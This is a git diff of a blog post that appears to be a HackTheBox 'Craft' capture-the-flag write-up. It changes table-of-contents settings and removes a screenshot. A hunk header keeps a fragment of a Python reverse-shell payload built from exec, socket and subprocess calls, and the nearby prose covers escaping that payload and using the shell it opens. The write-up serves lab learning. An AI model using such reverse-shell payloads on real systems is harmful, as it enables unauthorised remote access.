@@ -4,7 +4,9 @@ date: 2019-12-09T14:54:54-05:00
 categories:
   - HackTheBox
 toc: true
-toc_sticky: true
+toc_sticky: false
+toc_label: "Table of Awesome Content"
+toc_icon: "cog"
 ---
 <img class="alignnone size-full wp-image-402" src="/assets/uploads/2019/12/craft_logo.jpg" alt="" width="300" height="300" srcset="/assets/uploads/2019/12/craft_logo.jpg 300w, /assets/uploads/2019/12/craft_logo-150x150.jpg 150w" sizes="(max-width: 300px) 100vw, 300px" />
 
@@ -266,8 +268,6 @@ payload = "exec(\"import socket, subprocess;s = socket.socket();s.connect((\'127
 Notice that the newline is double escaped, and quotes inside the exec() call are escaped.
 
 ## Initial Shell
-
-<img class="alignnone size-full wp-image-455" src="/assets/uploads/2019/12/2019-12-05_18h12_56.png" alt="" width="801" height="333" /> 
 
 Once your shellcode works and you have a reverse connection, start poking around the box and seeing what&#8217;s listed. I found that you won&#8217;t be able to change directory, it&#8217;s some sort of jail. But there&#8217;s no trouble listing files and directories, and even dumping their contents with &#8216;cat&#8217;. I couldn&#8217;t get &#8216;vi&#8217; to work with this limited shell, but it&#8217;s not needed at this point.
 
